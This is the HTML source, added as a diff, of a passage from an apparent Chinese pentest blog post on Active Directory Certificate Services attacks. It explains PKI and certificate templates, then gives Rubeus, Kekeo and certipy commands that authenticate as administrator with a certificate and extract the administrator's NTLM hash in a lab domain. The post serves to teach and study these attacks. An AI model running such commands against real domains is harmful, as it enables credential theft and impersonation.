@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ADCS攻击 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='ADCS'>
+  <meta itemprop="name" content="ADCS攻击">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-05-07T19:22:50+08:00">
+  <meta itemprop="dateModified" content="2025-05-07T19:22:50+08:00">
+  <meta itemprop="wordCount" content="3983">
+  <meta itemprop="image" content="https://nlrvana.github.io/avatar.png">
+  <meta itemprop="keywords" content="ADCS"><meta property="og:url" content="https://nlrvana.github.io/adcs%E6%94%BB%E5%87%BB/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="ADCS攻击">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-07T19:22:50+08:00">
+    <meta property="article:modified_time" content="2025-05-07T19:22:50+08:00">
+    <meta property="article:tag" content="ADCS">
+    <meta property="og:image" content="https://nlrvana.github.io/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://nlrvana.github.io/avatar.png">
+  <meta name="twitter:title" content="ADCS攻击">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://nlrvana.github.io/adcs%E6%94%BB%E5%87%BB/" title="ADCS攻击 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="https://nlrvana.github.io/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" title="委派攻击" /><link rel="next" type="text/html" href="https://nlrvana.github.io/jndi%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/" title="JNDI学习记录(1)" /><link rel="alternate" type="text/markdown" href="https://nlrvana.github.io/adcs%E6%94%BB%E5%87%BB/index.md" title="ADCS攻击 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ADCS攻击",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/adcs%E6%94%BB%E5%87%BB\/"
+    },"genre": "posts","keywords": "ADCS","wordcount":  3983 ,
+    "url": "https:\/\/nlrvana.github.io\/adcs%E6%94%BB%E5%87%BB\/","datePublished": "2025-05-07T19:22:50+08:00","dateModified": "2025-05-07T19:22:50+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">ADCS攻击</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>ADCS攻击</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category" title="Category - 内网渗透"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 内网渗透</a></span></div><div class="post-meta-line"><span title="published on 2025-05-07 19:22:50"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-07">2025-05-07</time></span>&nbsp;<span title="3983 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 4000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="ADCS攻击"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础知识">基础知识</a>
+      <ul>
+        <li><a href="#pki">PKI</a></li>
+        <li><a href="#pkinit-kerberos认证">PKINIT Kerberos认证</a></li>
+        <li><a href="#证书模版">证书模版</a>
+          <ul>
+            <li><a href="#用户模版">用户模版</a></li>
+            <li><a href="#计算机模版">计算机模版</a></li>
+          </ul>
+        </li>
+        <li><a href="#证书注册">证书注册</a></li>
+        <li><a href="#导出证书">导出证书</a></li>
+      </ul>
+    </li>
+    <li><a href="#adcs的安全问题">ADCS的安全问题</a>
+      <ul>
+        <li><a href="#web证书注册接口ntlm-relay攻击">Web证书注册接口NTLM Relay攻击</a>
+          <ul>
+            <li><a href="#漏洞原理">漏洞原理</a></li>
+          </ul>
+        </li>
+        <li><a href="#证书模版错误攻击">证书模版错误攻击</a>
+          <ul>
+            <li><a href="#esc1">ESC1</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#reference">Reference</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="基础知识" class="heading-element"><span>基础知识</span>
+  <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="pki" class="heading-element"><span>PKI</span>
+  <a href="#pki" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>PKI(Public Key Infrastructure,公钥基础设施)是提供公钥加密和数字签名服务的系统或平台，是一个包括硬件、软件、人员、策略和规程的集合，实现基于公钥密码体制的密码和证书的产生、管理、存储、分发和撤销等功能。企业通过采用PKI框架管理密钥和证书，可以建立一个安全的网络环境。<br>
+PKI的基础技术包括公钥加密、数字签名、数据完整性机制、数字信封(混合加密)、双重数字签名等。PKI体系能够实现的功能包括身份验证、数据完整性、数据机密性、操作的不可否认性。<br>
+微软的ADCS就是对PKI的实现，ADCS能够与现有的ADDS进行结合，用于身份验证、公钥加密和数字签名等。ADCS提供所有与PKI相关的组件作为角色服务。每个角色服务负责证书基础架构的特定部分，同时协同工作以形成完整的解决方案。<br>
+(1)CA<br>
+CA(Certificate Authority，证书颁发机构)是PKI系统的核心，其作用包括处理证书申请、证书发放、证书更新、管理已办法的证书、吊销证书和发布证书吊销列表(CRL)等。<br>
+ADCS中的CA有企业CA和独立CA。企业CA必须是域成员，并且通常处于联机状态以颁发证书或证书策略。独立CA可以是成员、工作组或域。独立CA不需要ADDS，并且可以在没有网络的情况下使用。但是在域中基本都是使用企业CA，因为企业CA可以和ADDS进行结合，其信息也存储在活动目录数据库中。企业CA支持基于证书模块创建证书和自动注册证书。<br>
+CA拥有公钥和私钥：</p>
+<ul>
+<li>私钥只有CA知道，私钥用于对颁发的证书进行数字签名。</li>
+<li>公钥任何人都可以知道，公钥用于验证证书是否由CA证书颁发。<br>
+那么，如何让客户端信任CA呢？<br>
+我们平时访问https类型的网站，如百度，通过查看其证书可以看到他的根CA，并且显示此证书有效。<br>
+由于已经导入了我们系统信任的根CA，因此通过该根CA颁发的所有证书都是可信的。<br>
+而在活动目录内自己搭建的ADCS，由于在安装企业根CA时，系统使用组策略将根CA添加到域内所有机器的&quot;受信任的根证书颁发机构&quot;中了，因此域内机器默认都信任此根CA颁发的证书。<br>
+(2)CA层次结构<br>
+常见的CA层次结构有两个级别：根和二级CA。二级CA也叫子从属CA。根CA位于顶级，子从属CA位于第二级。在这种层次结构下，根CA给子从属CA颁发证书认证，子从属CA给下面的应用颁发和管理证书，根CA不直接给应用颁发证书。<br>
+CA的层次结构有如下优点：</li>
+<li>管理层次分明，便于集中管理、政策制定和实施。</li>
+<li>提高CA中心的总体性能、减少瓶颈；</li>
+<li>有充分的灵活性和可扩展性；</li>
+<li>有利于保证CA中心的证书验证效率。<br>
+(3)CRL<br>
+CRL(Certificate Revocation List,证书作废列表)即&quot;证书黑名单&quot;，在证书的有效期间，由于某种原因(如人员调动、私钥泄漏等)导致相应的数字证书内容不再真实可信，此时需要进行证书撤销，说明该证书无效，CRL中列出了被撤销的证书序列号。</li>
+</ul>
+<h3 id="pkinit-kerberos认证" class="heading-element"><span>PKINIT Kerberos认证</span>
+  <a href="#pkinit-kerberos%e8%ae%a4%e8%af%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在AS-REQ过程中，Kerberos预身份认证使用的是用户Hash加密时间戳。而ADCS与ADDS紧密配合使用，那我们能够利用证书来进行Kerberos预身份认证呢？<br>
+在RFC4556 Public Key Cryptography for Initial Authentication in Kerberos(PKINIT)中引入了对Kerbeos预身份验证的公钥加密技术支持，可以使用证书的密钥来进行Kerberos预身份认证。<br>
+使用<code>Rubeus</code>执行如下命令用证书<code>administrator.pfx</code>进行<code>Kerberos</code>认证。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /domain:xie.com /dc:DC01.xie.com  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>当使用证书进行Kerberos认证时，返回的票据PAC中包含用户的NTLM Hash。<br>
+使用<code>Kekeo</code>执行如下命令获得<code>administrator.pfx</code>证书对应的<code>administrator</code>用户的<code>NTLM Hash</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tgt::pac /subject:administrator /castore:current_user /domain:xie.com /user:administrator /cred  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>无论<code>administrator</code>用户密码怎么更改，使用<code>administrator.pfx</code>证书获取的<code>administrator</code>用户的NTLM Hash都是最新的。</p>
+<h3 id="证书模版" class="heading-element"><span>证书模版</span>
+  <a href="#%e8%af%81%e4%b9%a6%e6%a8%a1%e7%89%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>证书模版(certificate template)是CA的一个组成部分，是证书策略中重要元素，是用于证书注册、使用和管理的一组规则和格式。当CA收到对证书的请求时，必须对该请求应用一组规则和设置，以执行所请求的功能，例如证书颁发或更新。这些规则可以是简单的，也可以是复杂的，适用于所有用户或特定的用户组。<br>
+证书模版是在CA上配置并应用于传入证书请求的一组规则和设置。证书模版还向客户机提供了如何创建和提交有效的证书请求的说明。基于证书模版的证书只能向企业CA颁发。这些模版存储在ADDS中，以供林中的每个CA使用。这允许CA始终能够访问当前标准模版，并确保跨林情况下应用一致。<br>
+证书模版允许管理员发布预先配置的证书，可以大大简化管理CA的任务。证书模版管理单元允许管理员执行以下任务：</p>
+<ul>
+<li>查看每个证书模版的属性</li>
+<li>复制和修改证书模版</li>
+<li>控制哪些用户和计算机可以读取模版并注册证书；</li>
+<li>执行与证书模版相关的其他管理任务。<br>
+上面提到了利用证书能进行<code>PKINIT Kerberos</code>认证，但是并不是所有的证书都能进行<code>PKINIT Kerberos</code>认证。那么，到底哪些模版的证书可用于<code>Kerberos</code>认证呢？<br>
+在<code>Certified_Pre-Owned.pdf</code>中提到，具有以下扩展权限的证书可以用于Kerberos认证：</li>
+<li>客户端身份验证，对应的OID为<code>1.3.6.1.5.5.7.3.2</code></li>
+<li><code>PKINIT</code>客户端身份验证，对应的<code>OID</code>为<code>1.3.6.1.5.2.3.4</code></li>
+<li>智能卡登陆，对应的OID为<code>1.3.6.1.4.1.411.20.2.2</code></li>
+<li>任何目的，对应的<code>OID</code>为<code>2.5.29.37.0</code></li>
+<li>子CA</li>
+</ul>
+<h4 id="用户模版" class="heading-element"><span>用户模版</span>
+  <a href="#%e7%94%a8%e6%88%b7%e6%a8%a1%e7%89%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>用户模版是默认的证书模版。其扩展属性中有客户端身份验证，因此用户模版申请的证书可以用于<code>Kerberos</code>身份认证。<br>
+利用<code>certipy</code>执行如下命令以普通用户hack的权限申请注册一个用户模版的证书<br>
+<code>certipy req -dc-ip 10.211.5.4 &quot;xie.com/hack:Password@CA-Server.xie.com&quot; -ca xie-CA-SERVER-CA -template User -debug</code></p>
+<h4 id="计算机模版" class="heading-element"><span>计算机模版</span>
+  <a href="#%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%a8%a1%e7%89%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>计算机模版是默认的证书模版。其扩展属性中有客户端身份验证，因此计算机模版申请的证书可以用于Kerberos身份验证。<br>
+利用<code>certipy</code>执行如下命令以普通机器用户<code>machine$</code>的权限申请注册一个计算机模版的证书。<br>
+<code>certipy req -dc-ip 10.211.5.4 &quot;xie.com/machine$:root@CA-Server.xie.com&quot; -ca xie-CA-SERVER-CA -template Machine -debug</code></p>
+<h3 id="证书注册" class="heading-element"><span>证书注册</span>
+  <a href="#%e8%af%81%e4%b9%a6%e6%b3%a8%e5%86%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>现在来看证书的注册流程<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505021330063.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505021330063.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505021330063.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505021330063.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505021330063.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505021330063.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<ul>
+<li>客户端生成一对公、私钥。</li>
+<li>客户端生成证书签名请求(Certificate Signing Request,CSR)，其中包含客户端生成的公钥以及请求的证书模版、请求的主体等信息。整个CSR用客户端的私钥签名发送给CA。</li>
+<li>CA收到请求后，从中取出公钥对CSR进行签名校验。校验通过后判断客户端请求的证书模版是否存在，如果存在，根据证书模版中的属性判断请求的主体是否有权限申请该证书。如果有权限，则还要根据其他属性，如发布要求、使用者名称、扩展等属性来生成证书。</li>
+<li>CA使用其私钥签名生成的证书并发送给客户端。</li>
+<li>客户端存储该证书在系统中。<br>
+在安装ADCS时，可以选择网络设备注册服务、证书颁发机构Web注册、证书注册Web服务。<br>
+这里讲一下证书颁发机构Web注册接口。<br>
+在安装ADCS时勾选了&quot;证书颁发机构Web注册&quot;选项，那么可以通过Web方式来申请证书。<br>
+访问ADCS的<code>10.211.5.4/Certsrv/</code>路径即可看到该注册接口，需要输入有效的用户名和密码进行认证。</li>
+</ul>
+<h3 id="导出证书" class="heading-element"><span>导出证书</span>
+  <a href="#%e5%af%bc%e5%87%ba%e8%af%81%e4%b9%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在某些场景下，我们需要导出证书进行一些操作，在导出证书前，需要先查看证书的Hash，因此需要先查看证书的信息。如下命令可用于查看用户证书和机器证书的信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
